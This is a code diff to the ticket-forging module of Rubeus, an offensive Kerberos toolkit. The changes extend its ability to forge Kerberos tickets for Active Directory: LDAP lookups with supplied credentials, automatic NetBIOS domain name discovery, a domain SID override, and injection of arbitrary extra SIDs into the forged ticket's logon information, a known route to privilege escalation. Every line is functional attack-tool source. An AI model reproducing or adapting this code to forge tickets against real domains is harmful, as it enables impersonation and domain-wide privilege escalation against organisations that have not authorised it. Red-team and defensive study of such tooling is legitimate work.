@@ -11,9 +11,12 @@ namespace Rubeus
 {
     public class ForgeTickets
     {
-        public static void ForgeTicket(string user, string sname, string keyString, Interop.KERB_ETYPE etype, bool fromldap = false, string sid = "", string domain = "", string domainController = "", int uid = 500, string outfile = null, bool ptt = false, Interop.TicketFlags flags = Interop.TicketFlags.forwardable | Interop.TicketFlags.renewable | Interop.TicketFlags.pre_authent)
+        public static void ForgeTicket(string user, string sname, string keyString, Interop.KERB_ETYPE etype, bool fromldap = false, System.Net.NetworkCredential ldapcred = null, string sid = "", string domain = "", string netbiosName = "", string domainController = "", int uid = 500, string sids = "", string outfile = null, bool ptt = false, Interop.TicketFlags flags = Interop.TicketFlags.forwardable | Interop.TicketFlags.renewable | Interop.TicketFlags.pre_authent)
         {
-            // initialise LogonInfo section
+            // vars
+            int c = 0;
+
+            // initialise LogonInfo section and set some defaults
             var kvi = Ndr._KERB_VALIDATION_INFO.CreateDefault();
             kvi.UserSessionKey = Ndr._USER_SESSION_KEY.CreateDefault();
             kvi.LogonTime = Ndr._FILETIME.CreateDefault();
@@ -22,6 +25,14 @@ namespace Rubeus
             kvi.KickOffTime = Ndr._FILETIME.CreateDefault();
             kvi.PasswordCanChange = Ndr._FILETIME.CreateDefault();
             kvi.PasswordMustChange = Ndr._FILETIME.CreateDefault();
+            kvi.UserAccountControl = 528;
+            kvi.UserFlags = 32;
+            if (String.IsNullOrEmpty(sids))
+            {
+                kvi.SidCount = 1;
+                kvi.ExtraSids = new Ndr._KERB_SID_AND_ATTRIBUTES[] {
+                        new Ndr._KERB_SID_AND_ATTRIBUTES(new Ndr._RPC_SID(new SecurityIdentifier("S-1-18-1")), 7)};
+            }
 
 
             // determine domain if not supplied
@@ -70,7 +81,7 @@ namespace Rubeus
                     {
                         domainController = Networking.GetDCName(domain); //if domain is null, this will try to find a DC in current user's domain
                     }
-                    directoryObject = Networking.GetLdapSearchRoot(null, "", domainController, domain);
+                    directoryObject = Networking.GetLdapSearchRoot(ldapcred, "", domainController, domain);
                     userSearcher = new DirectorySearcher(directoryObject);
                     // enable LDAP paged search to get all results, by pages of 1000 items
                     userSearcher.PageSize = 1000;
@@ -92,7 +103,7 @@ namespace Rubeus
                 {
                     string userSearchFilter = "";
 
-                    userSearchFilter = String.Format("(&(samAccountName={0}))", user);
+                    userSearchFilter = String.Format("(samAccountName={0})", user);
                     userSearcher.Filter = userSearchFilter;
                 }
                 catch (Exception ex)
@@ -100,6 +111,8 @@ namespace Rubeus
                     Console.WriteLine("\r\n[X] Error settings the domain searcher filter: {0}", ex.InnerException.Message);
                     return;
                 }
+
+                string domainDN = "";
 
                 try
                 {
@@ -113,6 +126,7 @@ namespace Rubeus
 
                     foreach (SearchResult u in users)
                     {
+                        domainDN = u.Properties["distinguishedname"][0].ToString().Substring(u.Properties["distinguishedname"][0].ToString().IndexOf("DC="));
                         kvi.EffectiveName = new Ndr._RPC_UNICODE_STRING(u.Properties["samAccountName"][0].ToString());
                         if (u.Properties["homedirectory"].Count > 0)
                         {
@@ -124,7 +138,10 @@ namespace Rubeus
                         }
                         string objectSid = (new SecurityIdentifier((byte[])u.Properties["objectsid"][0], 0)).Value;
                         string domainSid = objectSid.Substring(0, objectSid.LastIndexOf('-'));
-                        kvi.LogonDomainId = new Ndr._RPC_SID(new SecurityIdentifier(domainSid));
+                        if (String.IsNullOrEmpty(sid))
+                        {
+                            kvi.LogonDomainId = new Ndr._RPC_SID(new SecurityIdentifier(domainSid));
+                        }
                         kvi.LogonCount = short.Parse(u.Properties["logoncount"][0].ToString());
                         kvi.BadPasswordCount = short.Parse(u.Properties["badpwdcount"][0].ToString());
                         if (Int64.Parse(u.Properties["lastlogon"][0].ToString()) != 0)
@@ -177,7 +194,7 @@ namespace Rubeus
 
                         kvi.GroupCount = u.Properties["memberof"].Count;
                         kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[u.Properties["memberof"].Count];
-                        int c = 0;
+                        c = 0;
                         if (u.Properties["memberof"].Count > 0)
                         {
                             try
@@ -227,6 +244,42 @@ namespace Rubeus
                             }
                         }
 
+                        if (String.IsNullOrEmpty(netbiosName))
+                        {
+                            try
+                            {
+                                directoryObject = Networking.GetLdapSearchRoot(ldapcred, String.Format("CN=Configuration,{0}", domainDN), domainController, domain);
+                                userSearcher = new DirectorySearcher(directoryObject);
+                                // enable LDAP paged search to get all results, by pages of 1000 items
+                                userSearcher.PageSize = 1000;
+                                userSearcher.Filter = "(netbiosname=*)";
+                                SearchResultCollection netbios = userSearcher.FindAll();
+
+                                if (netbios.Count == 0)
+                                {
+                                    Console.WriteLine("[X] No groups returned by LDAP!");
+                                    return;
+                                }
+
+                                foreach (SearchResult n in netbios)
+                                {
+                                    kvi.LogonDomainName = new Ndr._RPC_UNICODE_STRING(n.Properties["netbiosname"][0].ToString());
+                                }
+                            }
+                            catch (Exception ex)
+                            {
+                                if (ex.InnerException != null)
+                                {
+                                    Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex.InnerException.Message);
+                                }
+                                else
+                                {
+                                    Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex.Message);
+                                }
+                                return;
+                            }
+                        }
+
                         /*Console.WriteLine("[*] SamAccountName         : {0}", u.Properties["samAccountName"][0].ToString());
                         Console.WriteLine("[*] Domain SID             : {0}", domainSid);
                         Console.WriteLine("[*] Last Logon             : {0}", DateTime.FromFileTime((long)u.Properties["lastlogon"][0]));*/
@@ -252,12 +305,26 @@ namespace Rubeus
             KrbCredInfo info = new KrbCredInfo();
 
             // overwrite any LogonInfo fields here sections
-            kvi.LogonDomainName = new Ndr._RPC_UNICODE_STRING("CHOCOLATE");
-            kvi.UserAccountControl = 528;
-            kvi.UserFlags = 32;
-            kvi.SidCount = 1;
-            kvi.ExtraSids = new Ndr._KERB_SID_AND_ATTRIBUTES[] {
-                    new Ndr._KERB_SID_AND_ATTRIBUTES(new Ndr._RPC_SID(new SecurityIdentifier("S-1-18-1")), 7)};
+            if (!String.IsNullOrEmpty(netbiosName))
+            {
+                kvi.LogonDomainName = new Ndr._RPC_UNICODE_STRING(netbiosName);
+            }
+            if (!String.IsNullOrEmpty(sid))
+            {
+                kvi.LogonDomainId = new Ndr._RPC_SID(new SecurityIdentifier(sid));
+            }
+            if (!String.IsNullOrEmpty(sids))
+            {
+                int numOfSids = sids.Split(',').Length;
+                kvi.SidCount = numOfSids;
+                kvi.ExtraSids = new Ndr._KERB_SID_AND_ATTRIBUTES[numOfSids];
+                c = 0;
+                foreach (string s in sids.Split(','))
+                {
+                    Array.Copy(new Ndr._KERB_SID_AND_ATTRIBUTES[] { new Ndr._KERB_SID_AND_ATTRIBUTES(new Ndr._RPC_SID(new SecurityIdentifier(s)), 7) }, 0, kvi.ExtraSids, c, 1);
+                    c += 1;
+                }
+            }
             LogonInfo li = new LogonInfo(kvi);
 
 
